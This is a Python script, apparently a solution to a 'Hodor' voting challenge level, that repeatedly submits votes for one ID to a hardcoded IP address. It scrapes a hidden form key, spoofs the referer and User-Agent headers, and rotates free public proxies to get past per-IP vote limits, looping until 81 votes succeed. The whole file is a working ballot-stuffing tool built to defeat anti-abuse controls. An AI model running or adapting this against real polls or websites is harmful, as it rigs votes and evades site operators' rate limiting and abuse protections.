#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
from lxml.html import fromstring
from fp.fp import FreeProxy

url_hodor = "http://158.69.76.135/level4.php"
proxies_used = []


def current_session():
    global proxies_used
    proxy = FreeProxy().get()
    if proxy in proxies_used:
        while proxy in proxies_used:
            proxy = FreeProxy().get()
            print("I'm here")
    print(f"Proxy: {proxy}")
    try:
        session = requests.Session()
        current = session.get(url_hodor)
        soup = BeautifulSoup(current.text, "html.parser")
        result = soup.find_all('input', {'type': 'hidden'})
        session_proxies = {
            'http': proxy,
            'https': proxy,
        }
        data = {
            "session": {
                "id": "4386",
                "holdthedoor": "Submit",
                "key": result[0].get("value"),
            },
            "headers": {
                "referer": url_hodor,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            }
        }
        res = session.post(
            url=url_hodor,
            data=data["session"],
            headers=data["headers"],
            proxies=session_proxies,
            timeout=5,
        )
        if len(res.text) > 100:
            voted = True
        else:
            print(res.text)
            proxies_used.append(proxy)
            print("Timed out")
            voted = False
    except Exception:
        print("Connection error, skipping.")
        proxies_used.append(proxy)
        voted = False
    return voted


success = 0
total = 0
while success < 81:
    voted = current_session()
    if not voted:
        print("Failed")
    else:
        success += 1
        print(f"Vote count: {success}")
    total += 1
    print(f"Summary: {success}/{total}")
